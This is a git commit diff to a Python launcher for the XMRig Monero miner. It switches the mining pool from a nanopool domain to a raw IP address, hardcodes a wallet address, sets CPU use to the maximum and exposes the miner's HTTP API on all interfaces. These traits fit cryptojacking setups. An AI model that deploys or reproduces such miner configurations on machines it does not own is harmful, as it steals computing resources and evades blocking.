09ce5d15a4b7e49cc2e4e94c9a3d926a41668934
giautoidi <76104011+giautoidi@users.noreply.github.com>
2023-10-10 16:29:51 +0700

    Update dao_nhanh_cpu.py

--- daonhanh/dao_nhanh_cpu.py
+++ daonhanh/dao_nhanh_cpu.py
@@ -4,7 +4,7 @@ import time
 from sys import platform
 import requests
 import subprocess
-import multiprocessing
+#import multiprocessing
 
 
 if platform == "linux" or platform == "linux2":
@@ -13,10 +13,10 @@ elif platform == "darwin":
     operate_system = 'OS X'
 elif platform == "win32":
     operate_system = 'win'
-cores = multiprocessing.cpu_count()
-cores = int(cores) / 2
-if cores <= 0:
-    cores = 1
+#cores = multiprocessing.cpu_count()
+#cores = int(cores) / 2
+#if cores <= 0:
+#    cores = 1
 timeout = 30
 thoi_gian_nghi = 28800
 
@@ -35,8 +35,10 @@ if operate_system == 'lin':
     except:
         pass
 import psutil
-command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --http-host=0.0.0.0 --http-port=80 -t %s' %cores
+#command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --http-host=0.0.0.0 --http-port=80 -t %s' %cores
 #command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
+command_xmrig_default = '--algo randomx -o 51.79.143.88:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
+
 while True:
     time.sleep(1)
     working_dir = os.path.dirname(os.path.realpath(__file__))
